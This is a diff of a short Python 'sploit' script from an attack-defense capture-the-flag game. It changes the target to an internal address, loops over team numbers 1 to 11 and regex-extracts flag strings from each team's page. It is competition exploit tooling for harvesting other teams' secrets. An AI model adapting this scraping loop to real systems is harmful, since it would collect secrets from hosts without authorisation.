@@ -5,10 +5,11 @@
 import requests
 import re
 
-URL = "http://judge.ad.kappactf.ru:8080/"
+URL = "http://6.0.0.1/team/"
 
 def sploit():
-    r = requests.get(URL)
-    print(re.findall(r"flag\s([A-Z0-9]{31}=)",r.text))
+    for i in range(1,12):
+        r = requests.get(URL+str(i))
+        print(re.findall(r"[A-Z0-9]{31}=",r.text)[0:4],flush=True)
 
 sploit()
